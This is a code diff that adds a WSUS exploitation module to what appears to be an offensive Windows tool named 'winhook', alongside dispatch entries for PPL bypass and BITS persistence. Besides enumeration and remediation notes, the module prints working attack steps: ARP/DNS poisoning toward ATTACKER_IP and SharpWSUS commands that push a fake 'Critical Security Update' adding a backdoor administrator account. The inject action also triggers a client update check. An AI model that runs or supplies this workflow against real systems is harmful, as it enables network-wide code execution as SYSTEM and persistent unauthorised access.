@@ -21020,6 +21020,271 @@ try {
   return { output: output.join("\n"), findings }
 }
 
+async function wsusAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] WSUS exploitation analysis...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== WSUS Configuration Enumeration ==="
+
+# Registry-based WSUS settings
+$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -ErrorAction SilentlyContinue
+$wuau = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU' -ErrorAction SilentlyContinue
+
+if ($wu) {
+  $wsusServer = $wu.WUServer
+  $wsusStatus = $wu.WUStatusServer
+  Write-Output "WSUS Server: $wsusServer"
+  Write-Output "WSUS Status Server: $wsusStatus"
+  Write-Output "WSUS_URL=$wsusServer"
+
+  # Critical: Check if WSUS uses HTTP (exploitable via MITM)
+  if ($wsusServer -and $wsusServer.StartsWith('http://')) {
+    Write-Output ""
+    Write-Output "[!] CRITICAL: WSUS uses HTTP (not HTTPS)"
+    Write-Output "[!] WSUS traffic is vulnerable to MITM attacks"
+    Write-Output "[!] An attacker on the network can inject fake updates"
+    Write-Output "WSUS_HTTP=1"
+  } elseif ($wsusServer -and $wsusServer.StartsWith('https://')) {
+    Write-Output ""
+    Write-Output "[*] WSUS uses HTTPS — MITM injection not directly possible"
+    Write-Output "[*] Check for certificate pinning bypass or compromised CA"
+    Write-Output "WSUS_HTTP=0"
+  }
+
+  Write-Output ""
+  Write-Output "Target Group: $($wu.TargetGroup)"
+  Write-Output "TargetGroupEnabled: $($wu.TargetGroupEnabled)"
+  Write-Output "DoNotConnectToWindowsUpdateInternetLocations: $($wu.DoNotConnectToWindowsUpdateInternetLocations)"
+} else {
+  Write-Output "[-] No WSUS configuration found — machine uses Windows Update directly"
+  Write-Output "WSUS_URL=NONE"
+  Write-Output "WSUS_HTTP=0"
+}
+
+if ($wuau) {
+  Write-Output ""
+  Write-Output "=== Update Policy ==="
+  Write-Output "UseWUServer: $($wuau.UseWUServer)"
+  Write-Output "NoAutoUpdate: $($wuau.NoAutoUpdate)"
+  Write-Output "AUOptions: $(switch ($wuau.AUOptions) { 2 { 'Notify before download' } 3 { 'Auto download, notify install' } 4 { 'Auto download and install' } 5 { 'Allow admin to choose' } default { $wuau.AUOptions } })"
+  Write-Output "ScheduledInstallDay: $($wuau.ScheduledInstallDay)"
+  Write-Output "ScheduledInstallTime: $($wuau.ScheduledInstallTime)"
+}
+
+# Check for recent update activity
+Write-Output ""
+Write-Output "=== Recent Update History ==="
+$session = New-Object -ComObject Microsoft.Update.Session
+$searcher = $session.CreateUpdateSearcher()
+try {
+  $count = $searcher.GetTotalHistoryCount()
+  $history = $searcher.QueryHistory(0, [Math]::Min($count, 10))
+  foreach ($entry in $history) {
+    $status = switch ($entry.ResultCode) { 0 { 'NotStarted' } 1 { 'InProgress' } 2 { 'Succeeded' } 3 { 'SucceededWithErrors' } 4 { 'Failed' } 5 { 'Aborted' } default { $entry.ResultCode } }
+    Write-Output "  [$status] $($entry.Date.ToString('yyyy-MM-dd HH:mm')) — $($entry.Title)"
+  }
+} catch {
+  Write-Output "  Could not retrieve update history: $_"
+}
+
+# Check WSUS server connectivity
+if ($wsusServer) {
+  Write-Output ""
+  Write-Output "=== WSUS Server Connectivity ==="
+  try {
+    $uri = [System.Uri]$wsusServer
+    $tcpTest = Test-NetConnection -ComputerName $uri.Host -Port $uri.Port -WarningAction SilentlyContinue
+    Write-Output "Host: $($uri.Host)"
+    Write-Output "Port: $($uri.Port)"
+    Write-Output "Reachable: $($tcpTest.TcpTestSucceeded)"
+    Write-Output "WSUS_REACHABLE=$(if ($tcpTest.TcpTestSucceeded) { '1' } else { '0' })"
+  } catch {
+    Write-Output "Connectivity test failed: $_"
+    Write-Output "WSUS_REACHABLE=0"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const wsusUrl = r.stdout.match(/WSUS_URL=(.+)/)
+    const isHttp = r.stdout.includes("WSUS_HTTP=1")
+
+    if (isHttp && wsusUrl) {
+      findings.push({
+        checkId: "WIN-WSUS-001",
+        provider: "windows",
+        severity: "critical",
+        status: "VULNERABLE",
+        resource: wsusUrl[1],
+        title: "WSUS configured over HTTP — vulnerable to update injection",
+        details: `WSUS server ${wsusUrl[1]} uses HTTP. An attacker performing ARP spoofing, DNS poisoning, or with network position can inject malicious updates via tools like SharpWSUS or WSUSpendu. This enables domain-wide code execution as SYSTEM.`,
+        remediation: "Configure WSUS to use HTTPS (SSL). Set WUServer and WUStatusServer to https:// URLs.",
+      })
+    }
+
+    if (wsusUrl && wsusUrl[1] !== "NONE") {
+      findings.push({
+        checkId: "WIN-WSUS-002",
+        provider: "windows",
+        severity: "medium",
+        status: "INFO",
+        resource: wsusUrl[1],
+        title: `WSUS server configured: ${wsusUrl[1]}`,
+        details: "Machine receives updates from a WSUS server. If this server is compromised, all clients can receive malicious updates.",
+        remediation: "Ensure WSUS server is hardened, uses HTTPS, and has restricted admin access.",
+      })
+    }
+  }
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== WSUS Attack Surface Assessment ==="
+
+$wu = Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate' -ErrorAction SilentlyContinue
+if (-not $wu -or -not $wu.WUServer) {
+  Write-Output "[-] No WSUS server configured — attack not applicable"
+  Write-Output "ATTACKABLE=0"
+  exit
+}
+
+$wsusServer = $wu.WUServer
+$isHttp = $wsusServer.StartsWith('http://')
+Write-Output "WSUS Server: $wsusServer"
+Write-Output "Protocol: $(if ($isHttp) { 'HTTP (EXPLOITABLE)' } else { 'HTTPS' })"
+Write-Output ""
+
+# Check 1: HTTP MITM
+if ($isHttp) {
+  Write-Output "[!] ATTACK VECTOR 1: MITM Update Injection"
+  Write-Output "    Prerequisite: Network position (ARP spoof, DNS poison, or same subnet)"
+  Write-Output "    Tool: SharpWSUS (https://github.com/nettitude/SharpWSUS)"
+  Write-Output "    Impact: Execute arbitrary commands as SYSTEM on ALL WSUS clients"
+  Write-Output ""
+  Write-Output "    Steps:"
+  Write-Output "    1. ARP spoof or DNS poison to redirect WSUS traffic"
+  Write-Output "    2. SharpWSUS.exe create /payload:C:\\Windows\\System32\\cmd.exe /args:'/c COMMAND' /title:'Security Update'"
+  Write-Output "    3. SharpWSUS.exe approve /updateid:UPDATE_GUID /computername:TARGET /groupname:'All Computers'"
+  Write-Output "    4. Wait for client to check for updates (or trigger: wuauclt /detectnow)"
+  Write-Output ""
+}
+
+# Check 2: WSUS server compromise
+Write-Output "[*] ATTACK VECTOR 2: WSUS Server Compromise"
+$uri = [System.Uri]$wsusServer
+Write-Output "    WSUS Host: $($uri.Host)"
+Write-Output "    If you compromise this server:"
+Write-Output "    - WSUSpendu: Inject updates into WSUS database directly"
+Write-Output "    - Modify SUSDB (WID or SQL Server)"
+Write-Output "    - All domain machines trust this update source"
+Write-Output ""
+
+# Check 3: Local privilege escalation via WSUS
+Write-Output "[*] ATTACK VECTOR 3: Local Privesc via WSUS (WSUSpect)"
+Write-Output "    If running as local admin but not SYSTEM:"
+Write-Output "    - Proxy WSUS traffic through localhost"
+Write-Output "    - Inject update that runs as SYSTEM"
+Write-Output "    - netsh winhttp set proxy 127.0.0.1:8080"
+Write-Output ""
+
+# Network position check
+Write-Output "=== Network Position Assessment ==="
+$gateway = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1).NextHop
+$localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.PrefixOrigin -eq 'Dhcp' -or $_.PrefixOrigin -eq 'Manual' } | Select-Object -First 1).IPAddress
+Write-Output "Local IP: $localIP"
+Write-Output "Gateway: $gateway"
+
+try {
+  $wsusIP = [System.Net.Dns]::GetHostAddresses($uri.Host) | Select-Object -First 1
+  Write-Output "WSUS IP: $wsusIP"
+
+  # Same subnet check
+  $localParts = $localIP.Split('.')
+  $wsusIPParts = ($wsusIP.ToString()).Split('.')
+  $sameSubnet = ($localParts[0] -eq $wsusIPParts[0]) -and ($localParts[1] -eq $wsusIPParts[1]) -and ($localParts[2] -eq $wsusIPParts[2])
+  Write-Output "Same Subnet: $(if ($sameSubnet) { 'YES (ARP spoofing feasible)' } else { 'NO (need routing-level MITM)' })"
+} catch {
+  Write-Output "Could not resolve WSUS server IP"
+}
+
+Write-Output ""
+Write-Output "ATTACKABLE=$(if ($isHttp) { '1' } else { '0' })"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("ATTACKABLE=1")) {
+      findings.push({
+        checkId: "WIN-WSUS-010",
+        provider: "windows",
+        severity: "critical",
+        status: "EXPLOITABLE",
+        resource: "wsus://mitm",
+        title: "WSUS MITM attack feasible — HTTP update channel",
+        details: "WSUS uses HTTP, allowing update injection via network MITM. Use SharpWSUS or WSUSpendu for domain-wide SYSTEM execution.",
+        remediation: "Migrate WSUS to HTTPS. As interim, enable certificate pinning.",
+      })
+    }
+  }
+
+  if (action === "inject") {
+    output.push("=== WSUS Update Injection ===")
+    output.push("")
+    output.push("[!] Direct WSUS injection requires SharpWSUS or WSUSpendu (compiled .NET tools)")
+    output.push("[*] PowerShell-only injection is not reliable — use the following workflow:")
+    output.push("")
+    output.push("Step 1: Verify HTTP WSUS")
+    output.push("  winhook wsus_abuse --action check")
+    output.push("")
+    output.push("Step 2: Set up MITM (if network position allows)")
+    output.push("  # ARP spoof: winhook responder_poison --action poison")
+    output.push("  # Or DNS poison: winhook adidns_poison --action inject --name WSUS_HOSTNAME --ip ATTACKER_IP")
+    output.push("")
+    output.push("Step 3: Use SharpWSUS on attacker machine")
+    output.push('  SharpWSUS.exe create /payload:"C:\\Windows\\System32\\cmd.exe" /args:"/c net user backdoor P@ss123 /add && net localgroup Administrators backdoor /add" /title:"Critical Security Update"')
+    output.push("  SharpWSUS.exe approve /updateid:GUID /computername:TARGET")
+    output.push("")
+    output.push("Step 4: Force client update check")
+
+    const r = await ps(`wuauclt /detectnow /reportnow 2>&1; Write-Output "Update check triggered"`, timeout)
+    output.push(`  ${r.stdout.trim()}`)
+    output.push("")
+    output.push("Step 5: Monitor")
+    output.push("  SharpWSUS.exe check /updateid:GUID /computername:TARGET")
+  }
+
+  if (action === "history") {
+    const script = `
+Write-Output "=== Full WSUS Update History ==="
+$session = New-Object -ComObject Microsoft.Update.Session
+$searcher = $session.CreateUpdateSearcher()
+try {
+  $count = $searcher.GetTotalHistoryCount()
+  Write-Output "Total updates: $count"
+  Write-Output ""
+  $history = $searcher.QueryHistory(0, $count)
+  foreach ($entry in $history) {
+    $status = switch ($entry.ResultCode) { 0 { 'NotStarted' } 1 { 'InProgress' } 2 { 'OK' } 3 { 'Partial' } 4 { 'FAILED' } 5 { 'Aborted' } default { $entry.ResultCode } }
+    $type = switch ($entry.Operation) { 1 { 'Install' } 2 { 'Uninstall' } default { 'Other' } }
+    Write-Output "[$status] $($entry.Date.ToString('yyyy-MM-dd HH:mm')) [$type] $($entry.Title)"
+    if ($entry.UnmappedResultCode -ne 0) {
+      Write-Output "    Error: 0x$($entry.UnmappedResultCode.ToString('X8'))"
+    }
+  }
+} catch {
+  Write-Output "Error: $_"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -24651,6 +24916,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   exchange_abuse: exchangeAbuse,
   ppl_bypass: pplBypass,
   bits_persist: bitsPersist,
+  wsus_abuse: wsusAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
